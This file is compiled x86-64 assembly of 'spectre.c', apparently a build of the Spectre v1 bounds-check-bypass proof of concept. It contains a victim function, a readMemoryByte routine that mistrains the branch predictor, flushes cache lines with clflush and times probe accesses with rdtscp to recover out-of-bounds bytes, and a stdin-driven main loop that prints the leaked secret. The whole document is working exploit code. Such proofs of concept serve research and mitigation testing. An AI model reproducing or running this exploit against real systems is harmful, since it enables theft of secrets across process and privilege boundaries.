	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leakByteLocalFunction           # -- Begin function leakByteLocalFunction
	.p2align	4, 0x90
	.type	leakByteLocalFunction,@function
leakByteLocalFunction:                  # @leakByteLocalFunction
	.cfi_startproc
# %bb.0:
	movl	%edi, %eax
	shlq	$9, %rax
	movb	array2(%rax), %al
	andb	%al, temp(%rip)
	retq
.Lfunc_end1:
	.size	leakByteLocalFunction, .Lfunc_end1-leakByteLocalFunction
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.LBB2_2
# %bb.1:
	movzbl	array1(%rdi), %eax
	shlq	$9, %rax
	movb	array2(%rax), %al
	andb	%al, temp(%rip)
.LBB2_2:
	retq
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdx, 24(%rsp)                  # 8-byte Spill
	movq	%rsi, 16(%rsp)                  # 8-byte Spill
	movq	%rdi, 32(%rsp)                  # 8-byte Spill
	movl	$readMemoryByte.results, %edi
	movl	$1024, %edx                     # imm = 0x400
	xorl	%esi, %esi
	callq	memset
	movl	$999, %r13d                     # imm = 0x3E7
	movl	$2863311531, %r12d              # imm = 0xAAAAAAAB
	jmp	.LBB3_2
	.p2align	4, 0x90
.LBB3_1:                                #   in Loop: Header=BB3_2 Depth=1
	leal	-1(%r13), %esi
	cmpl	$2, %r13d
	movl	%esi, %r13d
	jb	.LBB3_24
.LBB3_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_5 Depth 2
                                        #       Child Loop BB3_30 Depth 3
                                        #     Child Loop BB3_8 Depth 2
                                        #     Child Loop BB3_13 Depth 2
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_3:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	array2(%rax)
	clflush	array2+512(%rax)
	clflush	array2+1024(%rax)
	clflush	array2+1536(%rax)
	clflush	array2+2048(%rax)
	clflush	array2+2560(%rax)
	clflush	array2+3072(%rax)
	clflush	array2+3584(%rax)
	addq	$4096, %rax                     # imm = 0x1000
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB3_3
# %bb.4:                                #   in Loop: Header=BB3_2 Depth=1
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r14d
	movq	%r14, %rbx
	xorq	32(%rsp), %rbx                  # 8-byte Folded Reload
	movl	$29, %r15d
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_5 Depth=2
	movl	%r15d, %eax
	imulq	%r12, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r15d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rbx, %rdi
	xorq	%r14, %rdi
	callq	victim_function
	subl	$1, %r15d
	jb	.LBB3_7
.LBB3_5:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_30 Depth 3
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB3_6
	.p2align	4, 0x90
.LBB3_30:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_5 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB3_30
	jmp	.LBB3_6
	.p2align	4, 0x90
.LBB3_7:                                #   in Loop: Header=BB3_2 Depth=1
	movl	$13, %edi
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_8 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB3_12
.LBB3_8:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%dil, %ebp
	movq	%rbp, %rbx
	shlq	$9, %rbx
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	array2(%rbx), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB3_11
# %bb.9:                                #   in Loop: Header=BB3_8 Depth=2
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	array1(%rdx), %dil
	je	.LBB3_11
# %bb.10:                               #   in Loop: Header=BB3_8 Depth=2
	movl	%ebp, %eax
	addl	$1, readMemoryByte.results(,%rax,4)
	jmp	.LBB3_11
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_2 Depth=1
	movl	$-1, %edx
	xorl	%eax, %eax
	movl	$-1, %esi
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_13 Depth=2
	movl	%edx, %esi
	movl	%edi, %edx
.LBB3_29:                               #   in Loop: Header=BB3_13 Depth=2
	addq	$2, %rax
	cmpq	$256, %rax                      # imm = 0x100
	je	.LBB3_21
.LBB3_13:                               #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%edx, %edx
	js	.LBB3_14
# %bb.15:                               #   in Loop: Header=BB3_13 Depth=2
	movl	readMemoryByte.results(,%rax,4), %edi
	movl	%edx, %ebp
	cmpl	readMemoryByte.results(,%rbp,4), %edi
	jge	.LBB3_14
# %bb.16:                               #   in Loop: Header=BB3_13 Depth=2
	testl	%esi, %esi
	js	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_13 Depth=2
	movl	%esi, %ebp
	cmpl	readMemoryByte.results(,%rbp,4), %edi
	jl	.LBB3_19
.LBB3_18:                               #   in Loop: Header=BB3_13 Depth=2
	movl	%eax, %esi
	jmp	.LBB3_19
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_13 Depth=2
	movl	%edx, %esi
	movl	%eax, %edx
.LBB3_19:                               #   in Loop: Header=BB3_13 Depth=2
	leaq	1(%rax), %rdi
	testl	%edx, %edx
	js	.LBB3_20
# %bb.25:                               #   in Loop: Header=BB3_13 Depth=2
	movl	readMemoryByte.results+4(,%rax,4), %ebx
	movl	%edx, %ebp
	cmpl	readMemoryByte.results(,%rbp,4), %ebx
	jge	.LBB3_20
# %bb.26:                               #   in Loop: Header=BB3_13 Depth=2
	testl	%esi, %esi
	js	.LBB3_28
# %bb.27:                               #   in Loop: Header=BB3_13 Depth=2
	movl	%esi, %ebp
	cmpl	readMemoryByte.results(,%rbp,4), %ebx
	jl	.LBB3_29
.LBB3_28:                               #   in Loop: Header=BB3_13 Depth=2
	movl	%edi, %esi
	jmp	.LBB3_29
	.p2align	4, 0x90
.LBB3_21:                               #   in Loop: Header=BB3_2 Depth=1
	movslq	%edx, %rdx
	movl	readMemoryByte.results(,%rdx,4), %edi
	movslq	%esi, %rax
	movl	readMemoryByte.results(,%rax,4), %esi
	leal	(%rsi,%rsi), %ebp
	addl	$5, %ebp
	cmpl	%ebp, %edi
	jge	.LBB3_24
# %bb.22:                               #   in Loop: Header=BB3_2 Depth=1
	cmpl	$2, %edi
	jne	.LBB3_1
# %bb.23:                               #   in Loop: Header=BB3_2 Depth=1
	testl	%esi, %esi
	jne	.LBB3_1
.LBB3_24:
	xorl	%ecx, readMemoryByte.results(%rip)
	movq	16(%rsp), %rsi                  # 8-byte Reload
	movb	%dl, (%rsi)
	movl	readMemoryByte.results(,%rdx,4), %ecx
	movq	24(%rsp), %rdx                  # 8-byte Reload
	movl	%ecx, (%rdx)
	movb	%al, 1(%rsi)
	movl	readMemoryByte.results(,%rax,4), %eax
	movl	%eax, 4(%rdx)
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, %r13d
	leaq	14(%rsp), %r15
	leaq	24(%rsp), %rbp
	movl	$.L.str.9, %r12d
	jmp	.LBB4_1
	.p2align	4, 0x90
.LBB4_11:                               #   in Loop: Header=BB4_1 Depth=1
	xorl	%eax, %eax
	callq	getpid
	movl	$.L.str.13, %edi
	movl	$check+33, %esi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_10 Depth 2
	movq	stdin(%rip), %rdi
	callq	getc
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB4_1
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB4_11
# %bb.3:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB4_12
# %bb.4:                                #   in Loop: Header=BB4_1 Depth=1
	movq	secret(%rip), %rdx
	movl	$.L.str.1, %edi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	movl	$array1, %ecx
	subq	%rcx, %rax
	movq	%rax, 16(%rsp)
	callq	strlen
	movq	%rax, %rbx
	movl	%ebx, 8(%rsp)
	movl	$array2, %edi
	movl	$131072, %edx                   # imm = 0x20000
	movl	$1, %esi
	callq	memset
	cmpl	$3, %r13d
	jne	.LBB4_6
# %bb.5:                                #   in Loop: Header=BB4_1 Depth=1
	movq	32(%rsp), %rbx                  # 8-byte Reload
	movq	8(%rbx), %rdi
	movl	$.L.str.2, %esi
	leaq	16(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf
	movl	$array1, %eax
	subq	%rax, 16(%rsp)
	movq	16(%rbx), %rdi
	movl	$.L.str.3, %esi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf
	movq	16(%rsp), %rsi
	movl	8(%rsp), %edx
	movl	$.L.str.4, %edi
	xorl	%eax, %eax
	callq	printf
	movl	8(%rsp), %ebx
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	movl	$.L.str.5, %edi
	movl	%ebx, %esi
	xorl	%eax, %eax
	callq	printf
	jmp	.LBB4_10
	.p2align	4, 0x90
.LBB4_9:                                #   in Loop: Header=BB4_10 Depth=2
	movl	$10, %edi
	callq	putchar
.LBB4_10:                               #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	8(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 8(%rsp)
	testl	%eax, %eax
	jle	.LBB4_1
# %bb.7:                                #   in Loop: Header=BB4_10 Depth=2
	movq	16(%rsp), %rsi
	movl	$.L.str.6, %edi
	xorl	%eax, %eax
	callq	printf
	movq	16(%rsp), %rdi
	leaq	1(%rdi), %rax
	movq	%rax, 16(%rsp)
	movq	%r15, %rsi
	movq	%rbp, %rdx
	callq	readMemoryByte
	movl	24(%rsp), %ebx
	movl	28(%rsp), %r14d
	leal	(%r14,%r14), %eax
	cmpl	%eax, %ebx
	movl	$.L.str.8, %esi
	cmovlq	%r12, %rsi
	movl	$.L.str.7, %edi
	xorl	%eax, %eax
	callq	printf
	movzbl	14(%rsp), %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	movl	$.L.str.10, %edi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebx, %ecx
	xorl	%eax, %eax
	callq	printf
	testl	%r14d, %r14d
	jle	.LBB4_9
# %bb.8:                                #   in Loop: Header=BB4_10 Depth=2
	movzbl	15(%rsp), %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	movl	$.L.str.11, %edi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%r14d, %ecx
	xorl	%eax, %eax
	callq	printf
	jmp	.LBB4_9
.LBB4_12:
	xorl	%eax, %eax
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function


	.ident	"Ubuntu clang version 11.1.0-6"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
